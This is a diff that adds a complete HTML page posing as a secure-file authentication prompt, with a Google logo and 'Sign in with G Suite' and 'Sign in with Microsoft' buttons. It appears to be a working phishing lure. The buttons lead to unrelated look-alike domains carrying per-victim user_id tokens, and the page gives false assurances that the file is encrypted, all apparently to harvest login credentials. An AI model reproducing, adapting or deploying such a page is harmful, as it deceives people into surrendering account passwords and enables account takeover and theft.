@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authenticate to View Secure File</title>
+    <style>
+        /* General Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #f4f4f4, #e0e0e0);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 600px;
+            width: 100%;
+            background: #ffffff;
+            padding: 40px;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .logo {
+            width: 150px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 20px;
+            font-weight: 600;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: space-between;
+            gap: 20px;
+            margin-top: 30px;
+        }
+
+        .button-container a {
+            flex: 1;
+            text-align: center;
+            text-decoration: none;
+            padding: 15px 20px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #0072C6; /* Same color for both buttons */
+            color: #ffffff;
+        }
+
+        .button-container a:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+
+        .button-container a:active {
+            transform: translateY(0);
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .button-container a i {
+            margin-right: 10px;
+        }
+
+        .secure-note {
+            font-size: 14px;
+            color: #777;
+            margin-top: 30px;
+            line-height: 1.5;
+        }
+
+        .encryption-note {
+            font-size: 14px;
+            color: #4CAF50; /* Green color for emphasis */
+            margin-top: 15px;
+            font-weight: 500;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            .button-container {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .button-container a {
+                width: 100%;
+            }
+
+            .container {
+                padding: 20px;
+            }
+
+            h1 {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+       <p><img src="data:image/webp;base64,UklGRjINAABXRUJQVlA4WAoAAAAwAAAAgwAAoQAASUNDUMgBAAAAAAHIAAAAAAQwAABtbnRyUkdCIFhZWiAH4AABAAEAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAACRyWFlaAAABFAAAABRnWFlaAAABKAAAABRiWFlaAAABPAAAABR3dHB0AAABUAAAABRyVFJDAAABZAAAAChnVFJDAAABZAAAAChiVFJDAAABZAAAAChjcHJ0AAABjAAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAAgAAAAcAHMAUgBHAEJYWVogAAAAAAAAb6IAADj1AAADkFhZWiAAAAAAAABimQAAt4UAABjaWFlaIAAAAAAAACSgAAAPhAAAts9YWVogAAAAAAAA9tYAAQAAAADTLXBhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABtbHVjAAAAAAAAAAEAAAAMZW5VUwAAACAAAAAcAEcAbwBvAGcAbABlACAASQBuAGMALgAgADIAMAAxADZBTFBI8gAAAA2AZG3b8eaNjalte5T95GQh2UK1lY66BXtq24319Xufuo0IBm4bKUpzTIv3CBoaxy7JF+Od2FIqX0jK3BpI2RJHp4Dy5lWhEERjit4kAtt1JS2CK5I9qWWFsEXykxNbJwLgDHFx0g/xV0UEwOdBmL8MgEEI7oDY/S2hsoXAV90TAh8dJwg8rq0jcK14h8Bb48fho449BOw66aMQCH/pf//z7z9/xPHvP/ZzABgubAC4B3GoaPE/07kZxgbCNrvImmD/m5Ze8oxZGCxAYa7ClvnmkCJUzzeZ4hleiK1oi+cHxyhHi9//aMyyaB4ZoXkeVggCVlA4IEoKAADwMwCdASqEAKIAPlEijkWjoiESyl4kOAUEtDdur2uXT8d2SG+Ok/jl+5nSf73+Ffxm7A8svWF+Z/U7/j/275+egD7mfcA/Tb/Y9Qz9rvUB/MP7P/zv9J7Ov92/wHuA9AD+Vf2TrDP129hX+T/3D0u/2Z+Cb9r/2n9zD+4/9LrAOFI/vXZf/guji8Re0PH55p7PT4nys+1Xz92uP75vgebfsr6gXsx9B/0Hcweh/1o80b/Z+oH9O8DD6r/rvYA/jf9h/2X3GfDV/Tf3r8m/Zf+Sf4L/se4L/If6L/v/737QHq6/aX2F/12//AbJtr5JqwEnw8j3BPFPzp7l8L8a2jcN+Cxaxm5AkQf3gd+sV/3/sHrb9ZVB7uoLeMia2bktgdBLnJShRml0JSSk/9FbGn2xTu8cLPGhaM5Zo855yxqIqQ65Ppkrnpp3h2unfXKBrqB36lKmDPt1fCWbOi0dmG/Vp9sU6uMduTI64hdMoa/RLv2/yO2VBWbUjVAiprwdIO03lsq7Os/V1jhQYKP7B6VBDmnuq5wd3H3XHptpr1hcoNE4CUqeM0lAAPzi+bhyt8duFhSaaF3fKPKQpCtnrW8FpliRthntSR4ofSVBp82Xe3LM29685YijkIH/noF71Ge5dZfOKmmlKZjQHP+HbO3j/PeSpiUfk33Vj3GqVQ6BOQBqye1e8rIfbIfVMJeXHckEXki6GU1gPhlistJQ1I3Ua7DKRVL+9wi1piuopJGGwuWTH4GaAD1ZfzpayLsA30zoaPGIq+h7FFbE30srGFG8esXb+4RW/g+rA3uiYmqcdTgKtSEoloLhOqCw1I+S5iRX+laN8m8YX//fdPgfR72nTpg0utvi8CCOxcZZbBWVks319zXM9EE6MPav7/CswoDaucYnHbZnwQW7zOsa+vcaB3u5sf+Fu5T9q7BnqYOnpOTVzT9I4GE/RKaSFw8b7j7zp6+muB8+cJqWtirww9AfZzgn43oujuq1MbyqirgHGqV+tryTC0v07BohnI9J/w5DTD45yUJpHgH/mrfTD5XSdElGHrQzserl3RmFbXkRodVGsZEJNtVek4sDxa7BWVks3iU/Z86R8SP/se7gry9jfox7X1LB2TitSX//2/RXZ34Rcx0/PvH5DRbgLDsPzTUBFjzFk4kvVDuoDtxf/8OxzVCidqwqgg6IamZ5Ee0wF2KcgSn9jlu/ef6dVPH6huIjz/3vNivLQqTdGyCNRWcnOBePiMfakQjntx4axLppyAPKSkm9cxRfVUyYDayX9zYUqReChHdG7Zi4wOfzTCIHVB0kU9RmGH/hw5kVUNhAWc4Ja/c2f88AQgztBOGcEB9SU1bXhh7zR4l1DARQiPIpwGIRo5IUfj1DClrjYw0cNODutDlta0YISXySTWEgKkSEDfJ0V9N/CSUnc5lVs2WwLtcKGbH1sbig7CfDWdf4eDGvnTOwx5KVeqVijpbkLDPP4fGr3cllmflFgEJXap5Hwl1hJtNV7vm9Cu4q7pU1lKvyS20Yf/fOAqsUW2YtyCrkcrDchFsMTUip85cpatK+JfwHmEJekZtHA9waCGRHrirYnB+uvccTmi6472XYE7xnRObtv4lquZCHSzgxeINMF1xOsrw0+nqJfckWmBxj6J5TWKRqjJd7kz6Acw8SyGrO6n8I7rZhVYPeIyErHxsD9kbJFuzdBG/mGIjhubkOKiarpNU+P8T3LelmMw+F12qad9rAHu4Eb6SpW7414DeHyljsdSldvAJ9fus0HkY1sYX5oLSZRoXyd/qnjMdDmChvXtA+KqsLFkvrGfikPSeBzyZ1tax/C+rEgg9GCODJE6IdTdyz6k+IU8aDnQ9ImGSlD+h65WWhu1/eDxU/LPUwcheNV+dhfuh5OF+KtdeHLt2F9fkjvKMw0wu/t9S0kASLwB2/XP7UJ+uh73xFyo/2l16VbWkWufR2qz10Zu5i8nFBOmKSILqDfKdC7WE4x58fgVji96evtDf+kYHUZT9TD0Ujk/bV0GtY780ogNtAf64ELyMfEbumCXAX6l5vTq3zcS4k0SifmEzK7gfOYrX5jBMNzU428iUCgTfCaDweX7jfD9E15hv6CC1hzXQOkG/oh9XNxd/CjMOKeBSkSd3iyOhsVGEzywRI7sK0ylXlV/+DXxk90eGOf8CMtFVmaBUFYvdALbsHG+qnSi9+8eLCoXqUN4KrRMdQgs/d967TrvXLuBZ6yFvV3Z7JZ46a8H+zOTH+8vvZG21hnU/pmF7EOsh3u3XHUFnRuybu/xiEhZkCWzmDhd4ljC0D3J82YuGXUHK7UPK3dcikwbHQjLVKo8YhuylMcXnH/2PYdEa12kQ/196POeVPZOJewPNqQAtFrd60aiQk+KB8NSmAun0E9xruWgK7z6KDFOiyM1T09cGWdmzpgJT1u2Pcj6ct/SsKWMk9VMaibZdZ3PENHtXd/8pYurM5vZPPelZ0YIs1MF97FvIBMR1e6Z/9reIJvEbsb5KTHRLJEgAog5KexVRpNoBEemdUQA1J1XJpYamGpMJVHuJ9uZx5nj+WPPo0VVmiXtOqA2hjzWluZuBrdhWnuFz6kQVZjomAAQEGChn48yfw13OVEjClKvQGWTGylhO3hyxEYo5/Aac643fPP4MCXl5nyHd7lW8dAYP8AC3eTdqH5lt97Zve6/eXba/kewPzWHpkimwsuORj5rXjohckD42DR255SzJmJmtb68bTqtbdKefEdh7n7ROM66tqfl/DB1X0sv8+594UirJGvz27Y30nigntUnpKLW1s0XZeK1yCHeC48Y30D5/w1+f7D5J7WQ25Np2KRtyofj+22UbonCzBYlP21aLAZVhZK6ovPTtPgD2g36VOw+lT2o/8yXfq5jZb0gxWDyZhkA5HFgdwKz3v7AutI3aGWN07P4dIp9eTYU++OMPRRF4EV92oynwI0+5yrSFkukSzYV+jpFPrybCn8cV2QkfHtwwdPaPJeIZIfAac643fPPZHaUUoEZzTFuEe+AM7Ggzu8yiQ7GgKOORoQj2wLJxOBBBv/CZSq/K2aQTcntp3DeH4ta4QmAFjT8Ifza+PuvQvcdodFde4FLbzCAK3VHlz9GL/leUgl07mhSRe9ZRL5Bl5x6BxEbH+JYGzVvyuI7nfsEqXukIxkqOXm0xqrc4F9pkL/s0w/Q8lAL+p3QilCbeJh9iDRvH2Hk9vY8CkxlYo2k+hUaQJFzSfUemhrni1u9Kmr4tPSjpqPj1/aLvmlxcnkh/yEWAW33sglwJWxz/8Lz8XyfbGcWE85ySPG+O3icZ75sNCrMA1XqrViAI2b5UhZqsex58UzZq8YnNDILkemAwdNkF5ucpbv9Z/oJvEOD+GCn2JtYIi4Q+9WltLDYfkk5udfeoiFXyUCUPH0u1j9c+G8UZA/arB/xf3G///dITwVubEIdBg7sdjSKfABpyFvrukHBqV25LZFoAA9j+PlL4UTPexe3vnvI59fSylgi7t6GegdHz//hhuAvlAAAA="></p>
+        <h1>Authenticate to View Secure & Encrypted File</h1>
+        <div class="button-container">
+            <a href="https://accounts.corpaye.com/FPhXCrOQ?user_id=V6wwiWYe59DBfdby_u4spnUi_bH0DdvtuSgVnRuEhoqrGRvvW0IlxYodAQXRBlWZNhv2JxY6dKlqX-9VaZBAIRsy2OXx2MnxUwUNx0sU6j8">
+                <i class="fab fa-google"></i> Sign in with G Suite
+            </a>
+            <a href="https://office.daycaheating.com/lLaTnhkA?user_id=Fu9HjoC0Kc3h5l5G4AO4PMCEHoThPK23xk26usgg6SPSHXIu0EUzXIRK8McXMB2vnNqRUgTHG_CnFHZ_toVpmTDWhhD3VPKg5oK_">
+                <i class="fab fa-microsoft"></i> Sign in with Microsoft
+            </a>
+        </div>
+        <p class="encryption-note">
+            Your document is encrypted and securely stored for your safety.
+        </p>
+        <p class="secure-note">
+            This is a secure authentication request. Please sign in to verify access.
+        </p>
+    </div>
+
+    <!-- Font Awesome for Icons -->
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+</body>
+</html>
